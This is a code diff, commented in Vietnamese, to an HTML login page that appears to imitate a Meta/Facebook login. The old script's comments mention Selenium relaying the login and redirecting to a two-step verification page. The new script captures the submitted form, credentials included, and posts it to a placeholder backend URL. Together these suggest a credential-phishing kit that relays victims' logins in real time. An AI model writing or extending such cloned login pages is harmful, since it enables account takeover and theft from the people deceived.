@@ -60,19 +60,35 @@
             <p class="mt-2 text-gray-800 bg-none text-sm font-semibold mx-auto mb-20 hover:underline cursor-pointer">Forgotten Password?</p>
         </form>
         <script>
-            document.getElementById('login-button').addEventListener('click', function() {
-                // Giả lập quá trình đăng nhập và phản hồi từ Selenium
-                const loginSuccess = true; // Thay đổi giá trị này để kiểm tra
-    
-                if (loginSuccess) {
-                    // Chuyển hướng đến two_step_verification.html
-                    window.location.href = 'two_step_verification.html';
-                } else {
-                    // Chuyển hướng đến loginfail.html
-                    window.location.href = 'loginfail.html';
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Ngăn chặn hành vi mặc định của form
+
+            const formData = new FormData(this);
+            const data = new URLSearchParams(formData).toString();
+
+            fetch('https://your-backend-url/login', { // Thay thế bằng URL của backend
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: data
+            })
+            .then(response => {
+                if (response.ok) {
+                    return response.text(); // Hoặc response.json() nếu bạn trả về JSON
                 }
+                throw new Error('Login failed');
+            })
+            .then(data => {
+                // Xử lý phản hồi từ backend
+                console.log(data);
+                // Chuyển hướng hoặc hiển thị thông báo
+            })
+            .catch(error => {
+                console.error('Error:', error);
             });
-        </script>
+        });
+    </script>
         <div class="bottom bg-none flex flex-col">
             <button class="btn border border-blue-900 rounded-full mr-3 ml-3 py-2 text-blue-900 font-semibold hover:border-blue-600 hover:text-blue-600 hover:mr-4 hover:ml-4">Create new account</button>
             <img class="w-12 mx-auto bg-transparent" src="meta.svg" alt="">
